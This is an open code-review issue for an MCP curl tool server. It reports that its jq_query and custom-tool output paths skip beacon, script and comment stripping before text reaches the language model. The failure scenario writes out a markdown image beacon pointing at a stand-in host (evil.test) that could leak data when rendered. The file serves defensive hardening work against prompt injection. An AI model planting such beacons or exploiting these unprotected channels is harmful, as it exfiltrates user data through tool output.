---
id: 001
title: "Two text channels still take a shorter defence path than defendText"
status: open
severity: P1
tags: [code-review, security, class-fix]
class-id: lost-code-path
aliases: [unescaped-sink]
source: /sixees-workflow:review round 1, PR #32
reviewers: [typescript-reviewer, security-sentinel]
created: 2026-09-01
---

# Two text channels still take a shorter defence path than defendText

## Problem

`src/lib/tools/jq-query.ts::executeJqQuery` and
`src/lib/response/post-processor.ts::processTextPart` each defend their output
with `sanitizeAndDetect` alone. That is Step 2 of the five-step pipeline now factored
out as `src/lib/response/processor.ts::defendText`. Steps 3–5 — markup comment
stripping, the `<script>`/`<style>` fixed point, markdown beacon removal, and the
numeric-entity re-detect — do not run.

This is the **same class** as the header-channel defect fixed in PR #32 (see
`LESSONS.md` → RC-1): a text channel that reaches the LLM assembles its own,
shorter pipeline instead of calling the shared one.

**It is out of scope for PR #32** — `jq-query.ts` is not in that diff, and the
defect predates it. `typescript-reviewer` named it explicitly as the instance
that "sets the layer the fix belongs at", which is why `defendText` was extracted
as a shared export rather than inlined into the header path.

## Why it is P1 rather than lower

The file `jq_query` reads need not have been produced by this server. The tool's
own scope rules permit the temp dir, `MCP_CURL_OUTPUT_DIR` and the working
directory — so a file written by something else, containing markdown beacons or
script blocks, is returned to the model with those intact.

## Failure scenario

A response is saved to `MCP_CURL_OUTPUT_DIR` (or any file lands there) whose JSON
contains a string field holding `![x](https://evil.test/?d=…)`. `jq_query` with a
filter selecting that field returns the beacon verbatim. The same content
returned through `curl_execute` on a markdown response is replaced with
`[image removed]`.

## Instances

- `src/lib/tools/jq-query.ts::executeJqQuery` — `sanitizeAndDetect(filtered, basename(validatedFilePath))` — **confirmed**, out of scope for PR #32
- `src/lib/response/post-processor.ts::processTextPart` — `sanitizeAndDetect(text, hostname)` with no Steps 3-5 — **confirmed**, out of scope for PR #32, found by `security-sentinel` in review round 2.

  **This is the more serious of the two.** For `curl_execute` and YAML endpoints
  the wrap is genuine defence in depth, because `executeCurlRequest` already ran
  `defendText`. But for `registerCustomTool()` handler returns and
  `beforeRequest` short-circuit returns **the wrap is the only defence on the
  path** — and `CLAUDE.md` advertises it as exactly that guarantee. A library
  consumer whose custom tool fetches a remote document gets Unicode sanitisation
  and injection logging, and no beacon strip, no `<script>`/`<style>` strip and
  no comment strip.
- `src/lib/tools/curl-execute.ts::executeCurlRequest` (cURL stderr) — **FIXED in
  round 3.** Recorded because it is the instance that proves the old sweep was
  wrong: stderr reached the model with *no* pipeline, and under `verbose: true`
  carries the origin's own response headers. Now routed through `defendText` with
  the same arguments as the header channel.

## Sweep

```bash
# What reaches the returned text — NOT "who calls the weak function".
rg -n 'output\.[a-z_]+ = |text: ' src/lib/response/formatter.ts src/lib/tools/*.ts -g '!*.test.ts'
```

**The original sweep here was `rg 'sanitizeAndDetect\('`, and it was structurally
incapable of finding this class.** That query enumerates channels calling a
*weaker* defence; it can never surface a channel calling *none*. It is why cURL
stderr — which reached the model with no pipeline at all — went unfound for two
rounds while three reviewers ran variants of it. `.claude/rules/01-known-shapes.md`
K-4: *the sweep finds the shape it searched for*. Sweep the sink, not the helper.

Run after any fix. Legitimate remaining hits are only: the definition in
`security/detection-logger.ts`, the three calls **inside** `processor.ts` (two of
which are `defendText`'s own stages, one the post-jq re-sanitise), the outer wrap
in `post-processor.ts::createWrapper`, and doc comments. **Any other call site is
a channel that built its own pipeline.**

At time of filing: 6 non-comment hits → 4 legitimate, 2 confirmed instances.

## The complication that makes this not a one-liner

`processResponse` deliberately does **not** sniff `application/json` for markup,
because `<script>` legitimately appears inside JSON string fields. `jq_query`
operates on JSON-derived text and does not currently know a content type, so
passing `undefined` to `defendText` would let `isSniffableContentType` sniff it
and strip legitimate JSON string content.

That is the real design question here, and it is why this is filed rather than
fixed in passing.

## Proposed solutions

1. **Give `defendText` an explicit JSON-aware mode and call it from `jq_query`.**
   Pass `contentType: "application/json"` so the sniffer stays off but the
   markdown/beacon stages still run on the *filtered* output. Closes the class at
   the shared layer. Cost: needs a decision on whether beacon-stripping inside
   JSON string values is desirable — it probably is, since the model renders it.
2. **Defend at the point of return instead**, in the wrap, by upgrading
   `post-processor.ts::createWrapper` from sanitise+detect to full `defendText`.
   Closes this and every future channel at once. Cost: the wrap runs on *all*
   tool output including already-processed body text, so it would double-process
   and needs the idempotence checked; content type is not available there.
3. **Leave `jq_query` as is and document the asymmetry.** Cheapest, and honest
   only if the threat model genuinely differs — argue it explicitly rather than
   by omission.

Option 1 is the recommendation; option 2 is the one that would have prevented
RC-1 and is worth costing properly.

## Acceptance criteria

- [ ] The sweep above returns no call site outside the legitimate list.
- [ ] A regression test at `executeJqQuery` (the outermost boundary a real file
      reaches) asserts a beacon in a saved file is stripped in the returned text.
- [ ] A positive control asserts legitimate JSON string content containing
      `<script>` is **not** corrupted, so the fix cannot pass by over-stripping.
- [ ] `ARCHITECTURE.md` invariant 1a is satisfied by every channel, not just the
      two fixed in PR #32.

## Work log

- 2026-09-01 — filed from `/sixees-workflow:review` round 1 on PR #32. Not fixed
  in that PR: out of scope, and the JSON-sniffing question above needs a decision
  rather than a guess.
